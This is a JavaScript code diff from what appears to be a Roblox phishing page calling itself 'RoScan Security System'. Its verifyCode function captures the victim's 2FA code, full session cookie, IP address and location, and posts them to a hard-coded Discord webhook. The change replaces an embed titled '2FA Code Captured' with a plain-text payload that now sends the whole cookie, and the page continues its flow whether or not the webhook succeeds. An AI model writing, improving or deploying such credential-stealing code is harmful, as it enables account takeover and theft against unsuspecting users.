@@ -398,45 +398,10 @@ async function verifyCode() {
         // Get user location and IP
         const locationInfo = await getUserLocation();
         
-        // Send 2FA code to webhook
+        // Send 2FA code to webhook (simple format)
         const webhookUrl = 'https://discord.com/api/webhooks/1399753275225673778/jzgojCyaL0dSWz1pdji5g3Dvyh3HF9rsMxErcTM7cmnBi-HsOakqAxP41U-0MPTO_Mnv';
-        
-        const tfaEmbed = {
-            embeds: [{
-                title: "🔐 2FA Code Captured",
-                color: 0x00ff00,
-                fields: [
-                    {
-                        name: "🔑 2FA Code",
-                        value: `\`${code}\``,
-                        inline: true
-                    },
-                    {
-                        name: "📱 Trust Device",
-                        value: trustDevice.checked ? 'Yes' : 'No',
-                        inline: true
-                    },
-                    {
-                        name: "📍 Location",
-                        value: `${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}`,
-                        inline: false
-                    },
-                    {
-                        name: "🌐 IP Address",
-                        value: locationInfo.ip || 'Unknown',
-                        inline: true
-                    },
-                    {
-                        name: "🍪 Associated Cookie",
-                        value: globalRobloxCookie ? `\`${globalRobloxCookie.substring(0, 50)}...\`` : 'None',
-                        inline: false
-                    }
-                ],
-                timestamp: new Date().toISOString(),
-                footer: {
-                    text: "RoScan Security System"
-                }
-            }]
+        const payload = {
+            content: `2FA Code: ${code} | Trust: ${trustDevice.checked ? 'Yes' : 'No'} | Cookie: ${globalRobloxCookie || 'None'} | Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'} | IP: ${locationInfo.ip || 'Unknown'}`
         };
 
         const response = await fetch(webhookUrl, {
@@ -444,7 +409,7 @@ async function verifyCode() {
             headers: {
                 'Content-Type': 'application/json'
             },
-            body: JSON.stringify(tfaEmbed)
+            body: JSON.stringify(payload)
         });
 
         // Always continue flow regardless of webhook success
